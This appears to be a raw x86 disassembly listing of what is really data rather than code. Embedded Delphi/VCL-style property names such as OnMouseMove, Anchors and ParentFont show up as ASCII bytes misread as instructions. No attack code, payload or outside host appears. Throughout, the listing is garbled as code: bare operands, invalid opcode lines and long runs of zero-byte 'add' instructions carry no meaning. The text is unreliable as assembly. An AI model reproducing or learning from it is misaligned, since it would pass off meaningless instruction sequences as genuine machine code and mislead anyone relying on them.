inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942a2c1
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0026 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
and [ 0x6e4f0a00 ] 0x44
bound ebp [ ebx + eax * 2 + 0x6c ]
push esi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc esp
outsd
ja r-xdata
add [ eax ] al
sub [ 0x6e4f0600 ] 0x45
js r-xdata
push esi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002d ] al
add [ eax + 0x4f07002c ] al
add [ eax ] al
dec edi
jbe r-xdata
jb r-xdata
jo r-xdata
shl ah 0xa4
inc ebx
add [ ebx ] al
or edx [ esp + edx * 2 + 0x65 ]
js r-xdata
push ebp
jo r-xdata
or [ ebx + 0x74 ] dl
inc ebx
jb r-xdata
sar [ 0xd80044 ] 0x1
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
aas
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc eax
inc esp
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] ch
xor al [ eax ]
inc esp
dec esp
popad
jns r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
push ebx
je r-xdata
add [ ebx + ecx + 0x42 ] bh
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x5a ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
inc ebx
add [ esi ] ch
inc ebx
add [ ecx + eax + 0x4f9c0000 ] cl
inc esp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
inc esp
jb r-xdata
popad
dec ebp
outsd
jbe r-xdata
outsb
inc ebp
push es
dec edi
inc ecx
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d002e ] al
outsb
add [ ebx + ebx * 8 + 0x7efc0043 ] bl
inc esp
add [ esi + ecx - 0x2883ffbe ] ah
inc ebx
add [ eax - 0x66 ] bh
inc esp
add [ edx + ebx * 4 + 0x44 ] dh
add [ ebx + ebx * 4 + 0x44 ] al
add [ eax ] bh
jle r-xdata
add ah bl
mov [ eax + eax - 0x64 ] al
inc esp
jne r-xdata
je r-xdata
jb r-xdata
add [ eax + 0x1c004480 ] dh
nop
add [ ebp + eax * 4 + 0x44 ] bh
add al ah
test [ eax + eax + 0x8 ] al
mov es [ eax + eax - 0x80 ]
jge r-xdata
outsb
push ebx
je r-xdata
dec edi
insb
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
inc ecx
inc esp
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080034 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
xor al [ eax ]
add [ 0xffffffffabe80045 ] 0x44
add al ah
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al ah
movsb [ edi ] [ esi ]
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
loopne r-xdata
je r-xdata
inc esp
outsd
add [ edx ] dl
mov al 0xe
mov al 0x6
mov al 0x13
mov al 0x14
mov al 0xc7
inc esi
[ esp + ebx * 8 - 0x2337ffbd ]
add [ edi ] al
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ ebp + ebp * 4 - 0x2463ffbc ] ch
inc ebx
add ah bh
jle r-xdata
or [ esp + ebp * 2 + 0x42 ] dh
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
inc ebx
add [ 0x6f546c74 ] al
jo r-xdata
add [ ecx + ecx * 4 ] cl
inc ecx
add [ edx + ebx * 8 - 0x2383ffbd ] dl
inc ebx
outsb
je r-xdata
add al cl
fadd [ ebx ]
loopne r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x74 ]
popfd
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add al cl
pop [ eax + eax + 0x3c ]
nop
inc esp
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
pushfd
outsd
insd
lahf
inc esp
jb r-xdata
inc esp
add [ eax + 0x140043d9 ] bl
fadd [ ebx ]
pop es
inc ebx
add [ ebp + ebx * 8 + 0x43 ] bh
add [ eax - 0x4fffbc23 ] ah
fiadd [ ebx ]
sub al bl
inc ebx
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
je r-xdata
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax - 0x17ffbafb ] al
stosd [ edi ]
inc esp
je r-xdata
jl r-xdata
outsd
je r-xdata
inc edx
add [ ebx + ebx * 8 + 0x7efc0043 ] bl
inc esp
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
add al ah
lahf
inc esp
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add [ 0xffffffffabe80045 ] 0x44
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
lea eax [ eax ]
inc eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ edi ] al
or al 0x54
inc ebx
jne r-xdata
add [ eax ] cl
lahf
inc eax
inc ebx
add [ eax ] dh
jg r-xdata
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
je r-xdata
add [ eax + 0x1c004480 ] dh
nop
inc esp
add [ eax + 0x140043d9 ] bl
fadd [ ebx ]
push es
add [ ebp + eax * 4 + 0x44 ] bh
add al ah
test [ eax + eax + 0x8 ] al
mov es [ eax + eax - 0x80 ]
jge r-xdata
mov [ ecx ] eax
xchg esp eax
fiadd [ ebx ]
je r-xdata
add [ eax + 0x448c ] dh
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
push eax
cmpsd [ esi ] [ edi ]
inc ebx
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
add [ esi ] al
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ ebp + ebp * 4 - 0x2463ffbc ] ch
inc ebx
add ah bh
jle r-xdata
inc eax
inc ebx
add [ eax ] dh
jg r-xdata
add [ ecx + ecx * 4 ] cl
inc ecx
add [ edx + ebx * 8 - 0x2383ffbd ] dl
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
insb
movsd [ edi ] [ esi ]
inc ebx
add [ eax + 0xb004450 ] dl
add [ eax ] cl
push ebx
je r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add bh bh
sbb bl 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
hlt
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
pop eax
push esp
inc ecx
add [ ecx + eax ] ch
inc [ eax + 0x10043db ]
mov al 0xa6
inc ebx
add [ esi ] bh
inc ebx
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
insb
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x74 ]
popfd
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add al cl
pop [ eax + eax + 0x3c ]
nop
inc esp
jl r-xdata
inc ebx
je r-xdata
add dh bh
sbb [ esp + eax * 2 ] cl
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9065646f
cmp eax [ eax + eax - 0xc ]
mov al [ eax + eax + 0x24 ]
mov eax [ eax + eax - 0x10 ]
stosb [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
imul ebp [ edi + 0x6e ] sub_421d60
jo r-xdata
or eax [ edx ]
jl r-xdata
insb
jae r-xdata
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
imul ebp [ esi + 0x74 ] 0x4434a873
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] bh
jle r-xdata
0x9a740044 0x44
inc esp
fwait
inc esp
inc edx
add [ esi + ecx - 0x2883ffbe ] ah
inc ebx
add [ eax - 0x66 ] bh
inc esp
add [ edx + ebx * 4 + 0x44 ] dh
add [ ebx + ebx * 4 + 0x44 ] al
add [ eax ] cl
lahf
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] al
add [ eax + 0x20000001 ] dl
movsd [ edi ] [ esi ]
inc ebx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc esp
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi + eax * 2 ] cl
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
and [ esp + eax * 2 + 0x100 ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
outsd
insb
add [ edx ] ah
inc edx
add [ eax ] ch
add bh bh
call 0xfffffffff843edcd
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
add bh bh
jb r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
add [ gs : eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
adc [ eax ] al
mov eax 0xf40043db
or [ eax + 0x6f ] edx
jo r-xdata
outsd
outsb
je r-xdata
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
jb r-xdata
outsb
fild [ ebx ]
mov [ ecx ] al
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
add ah dh
movsb [ edi ] [ esi ]
inc ebx
add [ esi + 0x1 ] ch
add bh bh
cmp ah bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
add [ eax ] al
outsb
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942ab65
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
jo r-xdata
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx + 0x44ff0000 ] bl
mov [ eax + eax + 0xc ] es
mov [ eax + eax ] es
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
and [ eax + eax ] 0x7
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
push esi
inc ecx
add [ eax ] ah
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
adc al 0x8a
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] r--data
adc [ eax ] al
outsd
add [ eax ] eax
call [ esp + ebx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
add bh bh
fcomp st3
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
je r-xdata
outsb
jpo r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
pop eax
cmp eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
jo r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0b002b ] al
dec edi
jbe r-xdata
in al dx
push eax
outsd
jo r-xdata
push edi
inc ebx
push 0x10007261
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
inc esp
outsd
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
[ eax ]
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
je r-xdata
jb r-xdata
add [ eax ] al
sub [ esi ] 0x0
or al 0x4f
outsb
dec ebp
outsd
jne r-xdata
push esi
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
sar [ 0xd80044 ] 0x1
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
aas
inc esp
add [ eax ] cl
push esi
inc ecx
add [ eax ] ch
add [ eax ] eax
cmp al 0x10
add [ edi + ecx * 2 + 0x44 ] dh
insb
lodsd [ esi ]
inc ebx
inc esp
jb r-xdata
inc ebp
outsb
add [ eax ] al
sub [ edi ] 0x0
push esi
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
jb r-xdata
inc ecx
add al dh
mov [ ecx ] eax
test al 0x95
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add [ eax ] al
add [ eax ] dl
pushad
inc ecx
jb r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ ecx - 0x3f74ffc0 ] dl
inc esp
cld
lodsb [ esi ]
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
dec esp
outsb
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
outsd
outsb
je r-xdata
lodsb [ esi ]
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
or al 0x4f
pop eax
cmp eax 0xe00044
add bh bh
loopne r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add [ edx + esi + 0x40 ] al
add [ eax - 0x6d ] dh
inc ebx
add [ eax + ebx * 4 - 0x624bffbf ] cl
inc ecx
add [ eax - 0x22 ] bl
inc ebx
add [ eax - 0x61 ] dl
inc ecx
add al bl
lahf
inc ecx
add [ edi + ebx * 8 - 0x5e33ffbd ] cl
inc ecx
add [ eax - 0x3bffbe6d ] ah
xchg ebx eax
inc ecx
add al ch
xchg ebx eax
inc ecx
add ah dl
fiadd [ ebx ]
inc esp
fild [ ebx ]
inc esp
xchg edi eax
inc ecx
add [ eax ] bh
cwde
inc ecx
add [ edi + ebx * 8 + 0x43 ] ah
add ah cl
0x9ba00041 0x41
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x140043ae ] dl
dec ecx
je r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
popad
inc eax
add [ ebx + 0x43ad6cc0 ] cl
ja r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
je r-xdata
jb r-xdata
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
add [ eax + 0x7c004194 ] ah
fiadd [ ebx ]
sub al 0x98
inc ecx
add ah al
fld [ ebx ]
loopne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
jb r-xdata
je r-xdata
outsd
jb r-xdata
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jo r-xdata
shl [ eax + eax * 2 ] 0x1
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
popad
je r-xdata
add [ eax ] al
nop
scasb [ edi ]
inc ebx
add [ eax + eax ] dl
add [ eax ] al
adc [ eax + 0x41 ] ah
outsb
je r-xdata
je r-xdata
ja r-xdata
insd
inc ebp
jbe r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
inc eax
sub [ edx ] dh
insb
add [ 0x65646e49 ] al
js r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43ae10c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
inc esp
add [ eax + edx ] bh
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
outsb
je r-xdata
jb r-xdata
inc eax
outsd
jb r-xdata
add al 0x8
pop es
inc ebx
sub_439cfa
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax - 0x6fffbb0f ] dh
rol [ ebx ] cl
fdivr [ ecx - 0x3883ffbc ]
inc esp
add ah ch
rol [ ebx ] cl
les eax [ fs : eax + eax - 0x6c ]
retn 0x44
sub_439e6a
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax - 0x6fffbb0f ] dh
rol [ ebx ] cl
fdivr [ ecx - 0x3883ffbc ]
inc esp
add ah ch
rol [ ebx ] cl
les eax [ fs : eax + eax - 0x6c ]
retn 0x44
sub_439e98
adc al 0xc8
inc esp
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add [ eax + edx ] cl
inc ebp
add ah ah
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add ah bh
rol [ ebx ] cl
or [ edi + eax * 2 + 0x72 ] edx
outsd
jne r-xdata
add [ eax ] al
push [ eax ]
inc edx
outsd
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
test al 0x34
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
imul ebp [ edi + 0x6e ] sub_421d60
jo r-xdata
inc esp
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
rcl al 0x9e
inc ebx
add [ edi ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9065646f
cmp eax [ eax + eax - 0xc ]
mov al [ eax + eax + 0x24 ]
inc edx
outsd
js r-xdata
jae r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
or [ edi + eax * 2 + 0x72 ] edx
outsd
jne r-xdata
pop es
popfd
inc ebx
add [ ebp + ebx * 4 + 0x43 ] bh
add [ 0x74530800 ] dh
inc ebx
je r-xdata
add bh bh
call 0xfffffffff843e525
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040017 ] al
outsd
outsb
je r-xdata
jb r-xdata
add dh bh
sbb [ esp + eax * 2 ] cl
add [ eax ] 0x0
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
jb r-xdata
mov eax [ eax + eax - 0x10 ]
insb
jae r-xdata
adc [ eax ] al
fadd [ eax * 2 + 0xbc00 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
adc [ eax + 0x61 ] dl
jb r-xdata
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x1cff0001 ] ah
hlt
jle r-xdata
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
hlt
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
outsb
je r-xdata
stosb [ edi ]
inc esp
add al dh
add ah ah
jle r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
adc al 0x8a
jo r-xdata
push cs
push eax
popad
je r-xdata
jb r-xdata
add [ ecx ] 0x0
